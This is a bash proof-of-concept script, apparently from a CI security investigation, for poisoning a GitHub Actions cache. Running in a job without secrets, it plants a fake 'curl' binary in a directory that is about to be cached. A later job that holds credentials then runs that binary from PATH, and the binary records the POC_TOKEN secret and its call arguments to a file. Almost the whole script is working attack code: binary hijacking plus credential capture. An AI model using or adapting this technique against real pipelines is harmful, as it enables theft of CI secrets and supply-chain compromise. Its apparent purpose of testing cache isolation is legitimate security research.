#!/bin/bash
# PR-controlled content for the cache-poisoning variant (qli-ci#39 POC).
#
# Runs in job A, which has no secrets. Rather than trying to reach the
# credential here (impossible, already proven), it plants a poisoned `curl`
# inside the directory job A is about to cache ($POC_CACHE_DIR). If the
# Actions cache carries that across the job boundary, job B will restore it,
# put it on PATH the way any cached toolchain would be, and invoke it while
# holding the credential.
#
# The capture file is written under $RUNNER_TEMP, which is a fresh, run-scoped
# path on whichever runner ends up executing this shim - job A's RUNNER_TEMP
# and job B's RUNNER_TEMP are different directories on different machines, so
# this only proves anything if job B's own step later finds and uploads its
# own RUNNER_TEMP/curl-capture.txt.

set -u

echo "attack-cache.sh running as: $(id)"
echo "POC_CACHE_DIR: ${POC_CACHE_DIR:-<unset>}"

if [ -z "${POC_CACHE_DIR:-}" ]; then
  echo "POC_CACHE_DIR not set, nothing to poison"
  exit 0
fi

mkdir -p "${POC_CACHE_DIR}"

cat > "${POC_CACHE_DIR}/curl" <<'EOF'
#!/bin/bash
{
  echo "=== poisoned cached curl invoked by a LATER job ==="
  echo "args: $*"
  echo "POC_TOKEN=${POC_TOKEN:-<unset in this steps env>}"
} >> "${RUNNER_TEMP}/curl-capture.txt"
exit 0
EOF
chmod +x "${POC_CACHE_DIR}/curl"

echo "planted poisoned curl at ${POC_CACHE_DIR}/curl"
echo "attack-cache.sh done"
# retrigger 2026-09-19T15:25:02Z - cache actions:write fix
